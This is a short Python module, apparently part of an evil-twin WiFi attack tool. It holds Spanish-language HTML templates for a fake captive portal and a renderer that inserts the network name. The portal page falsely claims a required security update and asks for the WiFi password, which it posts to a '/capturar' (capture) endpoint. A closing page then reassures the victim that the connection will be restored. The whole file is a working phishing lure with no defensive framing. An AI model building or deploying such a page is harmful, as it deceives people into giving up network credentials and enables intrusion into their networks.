from __future__ import annotations

_PORTAL = (
    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Actualización de red</title></head>"
    "<body style='font-family:sans-serif;text-align:center;padding:40px'>"
    "<h2>Actualización de seguridad requerida</h2>"
    "<form method='POST' action='/capturar'>"
    "<input type='password' name='password' placeholder='Contraseña WiFi' "
    "style='padding:8px;width:240px;margin:12px 0'><br>"
    "<button type='submit' style='padding:8px 24px'>Conectar</button>"
    "</form></body></html>"
)

_CIERRE = (
    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<title>Conectando...</title></head>"
    "<body style='font-family:sans-serif;text-align:center;padding:50px'>"
    "<h2 style='color:#1a73e8'>Aplicando actualización...</h2>"
    "<p>Su conexión se restablecerá en breve.</p>"
    "</body></html>"
)

PLANTILLAS_DEFAULT: dict[str, str] = {
    "portal": _PORTAL,
    "cierre": _CIERRE,
}


class PortalRenderer:
    def __init__(self, plantillas: dict[str, str] | None = None) -> None:
        self._t = plantillas if plantillas is not None else PLANTILLAS_DEFAULT

    def portal(self, ssid: str) -> str:
        return self._t["portal"].replace("{ssid}", ssid)

    def cierre(self) -> str:
        return self._t["cierre"]
